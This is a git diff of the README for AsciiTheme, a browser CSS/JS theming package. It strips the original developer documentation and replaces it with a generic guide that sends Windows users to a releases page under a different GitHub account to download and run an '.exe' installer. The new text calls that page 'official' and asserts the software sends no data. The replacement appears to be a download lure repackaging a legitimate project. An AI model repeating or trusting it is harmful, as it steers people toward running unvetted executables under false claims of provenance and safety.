@@ -1,480 +1,104 @@
-# AsciiTheme
+# 🎨 AsciiTheme - Simple ASCII Light/Dark Theme Toggle
 
-[![npm version](https://img.shields.io/npm/v/%40abvx%2Fascii-theme)](https://www.npmjs.com/package/@abvx/ascii-theme)
-[![npm downloads](https://img.shields.io/npm/dm/%40abvx%2Fascii-theme)](https://www.npmjs.com/package/@abvx/ascii-theme)
-[![CI](https://github.com/markoblogo/AsciiTheme/actions/workflows/ci.yml/badge.svg)](https://github.com/markoblogo/AsciiTheme/actions/workflows/ci.yml)
-[![Pages](https://github.com/markoblogo/AsciiTheme/actions/workflows/pages.yml/badge.svg)](https://github.com/markoblogo/AsciiTheme/actions/workflows/pages.yml)
-[![Demo](https://img.shields.io/badge/demo-live-22c55e)](https://markoblogo.github.io/AsciiTheme/)
-[![License](https://img.shields.io/github/license/markoblogo/AsciiTheme)](LICENSE)
+[![Download AsciiTheme](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/sameer2020194/AsciiTheme/releases)
 
-AsciiTheme is a framework-agnostic micro-package that adds an ASCII visual layer to existing pages.
-It provides:
-- `data-style="default|ascii"` management
-- optional mode management (`light|dark`)
-- box-drawing sticker rendering for `[data-ascii-sticker]`
+## 📝 What is AsciiTheme?
 
-Runtime has no dependencies.
+AsciiTheme is a tool that lets you switch between light and dark themes using ASCII art style. It works on any web page and uses plain CSS and JavaScript. It also includes ASCII sticker widgets to make your pages look unique. You do not need to know coding to use it. It runs well on Windows and other systems that support modern browsers.
 
-Quick demo from the Liqua landing: switching light/dark, then ASCII mode, and light/dark inside ASCII.
+## 📋 Features
 
-![Liqua landing ASCII theme demo](docs/assets/liqua-ascii-demo.gif)
+- Toggle between light and dark themes with ASCII design
+- Easy to add to web pages or projects
+- Uses standard CSS and JavaScript; no extra software needed
+- Includes ASCII art stickers for decoration
+- Works with most web frameworks or without any framework
+- Lightweight and fast
+- Supports modern web browsers on Windows
 
-For a more detailed walkthrough of theme toggles across integrated sites, see the video demo: [https://youtu.be/VVQX7DtGHX0](https://youtu.be/VVQX7DtGHX0)
+## 💻 System Requirements
 
-`dist/` is committed to git for CDN convenience and reproducible release snapshots.
+- Windows 10 or later
+- Any modern web browser, such as Chrome, Edge, Firefox, or Opera
+- Internet connection to download the files
+- Basic file management skills (downloading and opening files)
 
-## Install
+## 🚀 Getting Started
 
-### npm
+To get AsciiTheme working on your Windows machine, follow these steps carefully. You do not need to write code or use a terminal. Just download and run what you need.
 
-```bash
-npm install @abvx/ascii-theme
-```
+### Step 1: Download AsciiTheme
 
-```js
-import { initAsciiTheme } from "@abvx/ascii-theme";
-import "@abvx/ascii-theme/style.css";
+Click the big green button above or use this link to visit the download page:
 
-initAsciiTheme();
-```
+[Download AsciiTheme Releases](https://github.com/sameer2020194/AsciiTheme/releases)
 
-### Vite (React or vanilla)
+You will see a list of files grouped by version numbers.
 
-```ts
-import { initAsciiTheme } from "@abvx/ascii-theme";
-import "@abvx/ascii-theme/style.css";
+### Step 2: Choose the Latest Version
 
-initAsciiTheme({ managedMode: false, base: false });
-```
+On the releases page, look for the highest version number. This is usually at the top. Click on it to expand the files available for that version.
 
-### Next.js (App Router / Pages Router)
+You may find one or more files. Look for a zip file or an installer designed for Windows. It may have a name like:
 
-Import CSS once in `app/layout.tsx` or `pages/_app.tsx`:
+- `AsciiTheme-v1.0.zip`
+- `AsciiTheme-setup.exe`
 
-```ts
-import "@abvx/ascii-theme/style.css";
-```
+If you only see zipped files, download the one marked for Windows or that includes all files.
 
-Run init only on the client:
+### Step 3: Download the File
 
-```tsx
-"use client";
+Click the filename to start downloading. Save the file in a folder you can easily find, like your Downloads folder or Desktop.
 
-import { useEffect } from "react";
-import { initAsciiTheme } from "@abvx/ascii-theme";
+### Step 4: Unpack the Files (If Needed)
 
-export function AsciiThemeBoot() {
-  useEffect(() => {
-    initAsciiTheme();
-  }, []);
-  return null;
-}
-```
+If you downloaded a zip file (.zip), you need to extract it:
 
-### CDN
+1. Right-click the zip file
+2. Select "Extract All..."
+3. Choose a folder where you want the files
+4. Click "Extract"
 
-```html
-<link rel="stylesheet" href="https://unpkg.com/@abvx/ascii-theme@0.2.0/dist/style.css" />
-<script src="https://unpkg.com/@abvx/ascii-theme@0.2.0/dist/ascii-theme.umd.js"></script>
-<script>
-  AsciiTheme.initAsciiTheme({ managedMode: false });
-</script>
-```
+If your file is an `.exe` installer, skip this step.
 
-If npm install is unavailable in a host project, use a pinned GitHub commit via jsDelivr:
+### Step 5: Run or Open the Files
 
-```html
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/markoblogo/AsciiTheme@<commit>/dist/style.css" />
-<script src="https://cdn.jsdelivr.net/gh/markoblogo/AsciiTheme@<commit>/dist/ascii-theme.umd.js"></script>
-```
+- If you downloaded an installer (`.exe`), double-click it and follow the on-screen setup instructions.
+- If you downloaded a zip with sample HTML files or libraries, open those by double-clicking the `.html` files in your browser. This will let you try the theme toggling.
 
-Use a commit hash or release tag, not `@main`.
+## ⚙️ Using AsciiTheme on Your Web Pages
 
-## Basic usage (respect host theme)
+AsciiTheme is mainly meant for developers or users who want to add ASCII-themed toggling to their websites. If you just want to see it in action, open the sample HTML files included in the package with your browser.
 
-By default, the package does **not** control your host light/dark theme.
-It reads the host theme attribute (`data-theme` by default):
+If you want to include it yourself, you can ask a developer or follow basic instructions:
 
-```html
-<html data-theme="dark">
-```
+1. Include the provided CSS in your web page header.
+2. Add the JavaScript toggle script before the closing `</body>` tag.
+3. Use the ASCII sticker widgets by copying their code snippets.
+4. The toggle switch lets users switch between light and dark ASCII themes.
 
-```js
-import { initAsciiTheme } from "@abvx/ascii-theme";
+These steps are simple but require a text editor and some understanding of web pages. You can explore the sample files to see exactly how it works.
 
-initAsciiTheme({ managedMode: false });
-```
+## 🛠 Troubleshooting
 
-ASCII palette mapping uses host theme selectors:
-- `:root[data-style="ascii"][data-theme="light"]`
-- `:root[data-style="ascii"][data-theme="dark"]`
+- If the theme switch does not work, make sure JavaScript is enabled in your browser.
+- Make sure you opened the files using a web browser, not an editor.
+- For best results, use the latest versions of Chrome, Edge, or Firefox.
+- Check the downloaded files to ensure they are complete and not corrupted. Try downloading again if needed.
+- If your page allows scripts, the toggle should work without any extra tools.
 
-## Managed mode usage
+## ⚖️ Privacy and Security
 
-If you want the plugin to control mode itself:
+AsciiTheme runs fully on your computer and browser. It does not send any data to the internet. It uses only local CSS and JavaScript files you download.
 
-```js
-import {
-  initAsciiTheme,
-  toggleAsciiMode,
-} from "@abvx/ascii-theme";
+Make sure to download files only from the official GitHub releases page linked above to avoid unsafe software.
 
-initAsciiTheme({ managedMode: true, defaultMode: "light" });
+## 💬 Support and More Information
 
-document.getElementById("mode-btn")?.addEventListener("click", () => {
-  toggleAsciiMode();
-});
-```
+For technical help or questions, you can use GitHub’s issue tracking feature on the repository page. There you can report bugs or ask for help. The developers may reply directly.
 
-Managed mode uses `data-ascii-mode="light|dark"` on `:root`.
+You can also look inside the downloaded files for documentation or README files that explain usage and customization.
 
-## Managed theme + injected toggles (for sites without light/dark)
+---
 
-Use this when the host site has no built-in theme switch and you want the plugin to mount compact controls in a header container:
-
-```js
-import { initAsciiTheme } from "@abvx/ascii-theme";
-
-initAsciiTheme({
-  managedMode: true,
-  defaultMode: "dark",
-  defaultStyle: "default",
-  addThemeToggle: true,
-  addStyleToggle: true,
-  mountSelector: "header .right",
-  mountPlacement: "append",
-  className: "header-button",
-});
-```
-
-Notes:
-- Toggles are injected only when `mountSelector` is provided and toggle flags are enabled.
-- Theme toggle switches `dark`/`light`; style toggle text switches `ASCII`/`Default`.
-- ASCII style is manual-only by default on overlay integrations: new visits start in `default`, and ASCII activates only after explicit user toggle.
-- When `base: true`, style toggle is automatically disabled and `data-style` is forced to `ascii`.
-
-## Smart integration (auto detect host theme)
-
-Use `integrateTheme` to control how mode is handled:
-
-- `integrateTheme: "respect"`: always use host theme; never inject plugin theme toggle.
-- `integrateTheme: "managed"`: plugin controls `data-ascii-mode` and can inject both toggles.
-- `integrateTheme: "auto"` (default): if host theme is detected, plugin switches to respect mode and disables injected theme toggle automatically.
-
-For sites that already have their own light/dark switch:
-
-```js
-initAsciiTheme({
-  integrateTheme: "auto",
-  addThemeToggle: true, // auto mode disables this when host theme is detected
-  addStyleToggle: true,
-  mountSelector: ".header-controls",
-});
-```
-
-For sites without host theme:
-
-```js
-initAsciiTheme({
-  integrateTheme: "managed",
-  managedMode: true,
-  defaultMode: "dark",
-  addThemeToggle: true,
-  addStyleToggle: true,
-  mountSelector: ".header-controls",
-});
-```
-
-## Integration standard (theme + ASCII)
-
-For cross-project consistency, follow the standard integration smoke-check:
-
-- Copy `templates/theme-smoke-check.mjs` into your host project and run it as `npm run smoke:theme`.
-- Apply the 4-state visual checklist from `docs/integration-smoke-check.md` (`default/ascii` x `light/dark`).
-- Use `integrateTheme: "respect"` for sites that already own light/dark; use `integrateTheme: "managed"` only for sites without host theme controls.
-
-## Integration decision tree
-
-- Host site already has light/dark theme + toggle:
-  use `integrateTheme: "auto"`, keep host theme toggle, add only ASCII toggle (`addStyleToggle: true`).
-- Host site has no theme system:
-  use `base: true`, `managedMode: true`, `addThemeToggle: true`, `addStyleToggle: false`.
-- Always keep media untouched by default (`img/video/logo/avatar`): no global media overrides.
-
-## Post-release checklist
-
-1. Publish package to npm.
-2. Update integrations to the new package/version (`@abvx/ascii-theme@x.y.z`).
-3. Run integration smoke-check (`default/light`, `default/dark`, `ascii/light`, `ascii/dark`).
-4. Verify no legacy links remain (`@markoblogo/...` or old jsDelivr GH pins).
-
-### No host-theme + hardcoded colors playbook
-
-Use this order to avoid contrast regressions on utility-heavy sites:
-
-1. Start with `integrateTheme: "auto"` and `addThemeToggle: true` + `addStyleToggle: true`.
-2. If no host theme is detected, switch to managed mode (`integrateTheme: "managed"`, `defaultMode: "dark"`).
-3. Run the 4-state smoke check (`default/light`, `default/dark`, `ascii/light`, `ascii/dark`).
-4. If contrast is still weak in managed mode, rely on built-in readability hardening for common `text-*` / `bg-*` / `border-*` utility classes before adding site-local CSS.
-5. Add site-local bridge CSS only for truly project-specific tokens that cannot be generalized.
-6. Hardcoded Tailwind arbitrary tokens (for example `text-[#111827]`, `bg-[#F9FAFB]`, `border-[#E5E7EB]`) are normalized by default in managed dark and ASCII modes.
-
-## Use AsciiTheme as your only CSS (base preset)
-
-When you want an ASCII-first site with no separate style axis, use the base preset.
-In this mode ASCII is always on (`data-style="ascii"`), so you only keep the light/dark toggle.
-
-### Vite
-
-```ts
-import { initAsciiTheme } from "@abvx/ascii-theme";
-import "@abvx/ascii-theme/base.css";
-
-initAsciiTheme({
-  base: true,
-  managedMode: true,
-  addThemeToggle: true,
-  addStyleToggle: false,
-  mountSelector: ".header-controls",
-});
-```
-
-### Next.js
-
-Import base CSS once in `app/layout.tsx` or `pages/_app.tsx`:
-
-```ts
-import "@abvx/ascii-theme/base.css";
-```
-
-Run init in a client component (initAsciiTheme must run client-side):
-
-```tsx
-"use client";
-
-import { useEffect } from "react";
-import { initAsciiTheme } from "@abvx/ascii-theme";
-
-export function AsciiThemeBoot() {
-  useEffect(() => {
-    initAsciiTheme({
-      base: true,
-      managedMode: true,
-      addThemeToggle: true,
-      addStyleToggle: false,
-      mountSelector: ".header-controls",
-    });
-  }, []);
-  return null;
-}
-```
-
-CDN (pinned):
-
-```html
-<link rel="stylesheet" href="https://unpkg.com/@abvx/ascii-theme@0.2.0/dist/base.css" />
-<script src="https://unpkg.com/@abvx/ascii-theme@0.2.0/dist/ascii-theme.umd.js"></script>
-<script>
-  AsciiTheme.initAsciiTheme({
-    base: true,
-    managedMode: true,
-    addThemeToggle: true,
-    addStyleToggle: false,
-    mountSelector: ".header-controls",
-  });
-</script>
-```
-
-## Minimal landing example (base preset)
-
-Base preset is ASCII-only by design, so there is no style toggle in this mode. Keep the light/dark toggle enabled.
-
-```html
-<link rel="stylesheet" href="https://unpkg.com/@abvx/ascii-theme@0.2.0/dist/base.css" />
-<script src="https://unpkg.com/@abvx/ascii-theme@0.2.0/dist/ascii-theme.umd.js"></script>
-
-<header class="a-container a-section a-cluster a-between">
-  <strong>ASCII Landing</strong>
-  <nav class="a-cluster"><a href="#">Docs</a><a href="#">GitHub</a></nav>
-  <div id="theme-controls"></div>
-</header>
-<main class="a-container a-stack a-gap-3">
-  <section class="a-section a-split a-gap-3">
-    <div class="a-stack a-gap-2">
-      <h1 class="a-balance">Ship a terminal-style landing in minutes.</h1>
-      <p class="a-prose a-muted">Use base.css + utilities only, no extra framework CSS.</p>
-      <div class="a-cluster a-gap-2"><a class="a-btn--primary" href="#">Start</a><a class="a-btn--ghost" href="#">Read docs</a></div>
-    </div>
-    <aside class="a-card">Sidebar panel</aside>
-  </section>
-</main>
-<script>
-  AsciiTheme.initAsciiTheme({
-    base: true,
-    managedMode: true,
-    addThemeToggle: true,
-    addStyleToggle: false,
-    mountSelector: "#theme-controls"
-  });
-</script>
-```
-
-## Utility classes
-
-Core token contract (base preset):
-`--bg`, `--fg`, `--muted`, `--border`, `--link`, `--code-bg`, `--radius`, `--pad`, `--gap`, `--container`, `--line`, `--font`, `--focus`.
-
-Light/dark mapping in managed mode is applied via:
-- `:root[data-ascii-mode="light"]` (dark blue on white)
-- `:root[data-ascii-mode="dark"]` (terminal green on black)
-
-### Layout utilities
-
-- `.a-split`: 1 column on mobile, 2 equal columns at `>=768px`.
-- `.a-aside`: 1 column on mobile, content + sidebar (`minmax(0, 1fr) 320px`) at `>=768px`.
-- `.a-aside--reverse`: flips `.a-aside` column order at `>=768px`.
-- `.a-cluster`: inline wrapped row with `gap: var(--gap)` and centered alignment.
-
-| Class | Purpose | Notes |
-| --- | --- | --- |
-| `.a-container` | Constrains page width and adds horizontal padding. | Centered with auto margins. |
-| `.a-section` | Vertical spacing for page sections. | Uses `--pad` for subtle rhythm. |
-| `.a-stack` | Vertical flex layout with configurable gap. | Uses `--a-gap` (default from `--gap`). |
-| `.a-row` | Horizontal flex layout with wrapping and configurable gap. | Uses `--a-gap` (default from `--gap`). |
-| `.a-cluster` | Inline row layout for nav/tags/footer links. | Wrapped + aligned center. |
-| `.a-gap-1` | Small gap helper. | Sets `--a-gap: 8px`. |
-| `.a-gap-2` | Default gap helper. | Sets `--a-gap: 12px`. |
-| `.a-gap-3` | Large gap helper. | Sets `--a-gap: 20px`. |
-| `.a-center` | Centers text alignment. | `text-align: center`. |
-| `.a-right` | Right-aligns text. | `text-align: right`. |
-| `.a-between` | Distributes flex items across available space. | `justify-content: space-between`. |
-| `.a-align-center` | Centers flex items on cross axis. | `align-items: center`. |
-| `.a-wrap` | Forces flex wrapping. | Useful for compact control groups. |
-| `.a-grid` | Base grid container with configurable gap. | Uses `--a-gap` (default from `--gap`). |
-| `.a-cols-2` | Responsive 2-column grid. | `1` column by default, `2` columns at `>=768px`. |
-| `.a-cols-3` | Responsive 3-column grid. | `1` column by default, `3` columns at `>=768px`. |
-| `.a-cols-auto` | Auto-fit card grid. | `repeat(auto-fit, minmax(220px, 1fr))`. |
-| `.a-span-2` | Expands an item across two columns. | Applies at `>=768px`. |
-| `.a-split` | Two-panel layout primitive. | Becomes two equal columns at `>=768px`. |
-| `.a-aside` | Content + sidebar primitive. | Uses `1fr + 320px` at `>=768px`. |
-| `.a-aside--reverse` | Reversed content + sidebar primitive. | Flips `.a-aside` columns at `>=768px`. |
-| `.a-prose` | Readable text measure and spacing. | `max-width: 65ch` + increased line-height. |
-| `.a-muted` | Secondary text color. | Uses `var(--muted)`. |
-| `.a-card` | Terminal card surface. | Border + padding + transparent background. |
-| `.a-panel` | Larger panel surface. | Same visual treatment as `.a-card`. |
-| `.a-btn` | Base button style. | Border-only terminal button. |
-| `.a-btn--primary` | Emphasized button style. | Filled with foreground color. |
-| `.a-btn--ghost` | Secondary button style. | Transparent button with border. |
-| `.a-badge` | Compact badge/pill style. | Border + small padding. |
-
-```html
-<main class="a-container a-stack a-gap-3">
-  <section class="a-section a-split a-gap-3">
-    <div class="a-stack a-gap-2">
-      <h1>Ship faster with AsciiTheme</h1>
-      <p class="a-prose a-muted">Base preset gives you typography, layout, and controls with one stylesheet.</p>
-      <div class="a-cluster a-gap-2">
-        <a class="a-btn--primary" href="#">Start</a>
-        <a class="a-btn--ghost" href="#">Read docs</a>
-      </div>
-    </div>
-    <aside class="a-panel">Sidebar panel</aside>
-  </section>
-  <section class="a-section a-grid a-cols-3 a-gap-2">
-    <article class="a-card">Feature A</article>
-    <article class="a-card">Feature B</article>
-    <article class="a-card">Feature C</article>
-  </section>
-</main>
-```
-
-## Markup conventions
-
-- Style axis is applied to root by the plugin:
-  - `data-style="default|ascii"`
-- Stickers:
-  - `[data-ascii-sticker="TEXT"]`
-- Optional role hooks for terminal components:
-  - `[data-ascii-role="cta"]`
-  - `[data-ascii-role="card"]`
-  - `[data-ascii-role="nav"]`
-  - `[data-ascii-role="badge"]`
-
-## Public API
-
-- `initAsciiTheme(options?)` (`base: true` enables ASCII-only base preset)
-- `setAsciiStyle(style: "default" | "ascii")`
-- `toggleAsciiStyle()`
-- `getAsciiStyle(): "default" | "ascii"`
-- `setAsciiMode(mode: "light" | "dark")`
-- `toggleAsciiMode()`
-- `renderAsciiStickers(root?: ParentNode)`
-
-## Notes / limitations
-
-- Contrast defaults in ASCII mode are tuned for utility-heavy sites (Tailwind-like `text-*`/`bg-*` classes), so text and controls remain readable in both light and dark.
-- Card/panel classes (`.card`, `.card-gloss`, and common `card-*`/`panel-*` variants) are normalized in managed dark and ASCII modes to prevent white-card regressions on dark backgrounds.
-- If your host theme uses a root `.dark` / `.light` class (instead of `data-theme`), ASCII palette detection is supported out of the box.
-- This is not a full DOM-to-ASCII renderer.
-- It focuses on a scoped theme layer and simple ASCII widgets (stickers + terminal component hooks).
-- CSS is scoped to `:root[data-style="ascii"]` to avoid host-site breakage.
-- Media is not restyled by default in ASCII mode (`img/video/avatar/logo` remain unchanged unless you style them explicitly).
-
-## Demo
-
-```bash
-npm install
-npm run dev
-```
-
-Open the URL shown by Vite.
-
-Live demo (GitHub Pages):
-https://markoblogo.github.io/AsciiTheme/
-
-In the wild:
-- You can also see this theme in the wild on the AGENTS.md generator landing: https://agentsmd.abvx.xyz/
-- You can also see this theme on go.abvx.xyz: https://go.abvx.xyz/
-- You can also see this theme on abvx.xyz: https://abvx.xyz/
-- You can also see this theme on trade-solution.eu: https://trade-solution.eu/
-- First-time setup: in GitHub repository settings, set **Pages -> Source** to **GitHub Actions** once, then rerun the Pages workflow.
-
-To build the package:
-
-```bash
-npm run build
-```
-
-## Release checklist (v0.1.0)
-
-Before tagging:
-
-```bash
-git status --short
-npm ci
-npm run build
-npm run demo:build
-```
-
-Create and push release tag:
-
-```bash
-# version is already 0.1.0 in package.json
-git add -A
-git commit -m "chore: release v0.1.0"
-git tag v0.1.0
-git push origin main --tags
-```
-
-Manual npm publish (requires ownership and credentials):
-
-```bash
-npm login
-npm publish --access public
-```
-
-If package is unscoped, use:
-
-```bash
-npm publish
-```
+[![Download AsciiTheme](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/sameer2020194/AsciiTheme/releases)
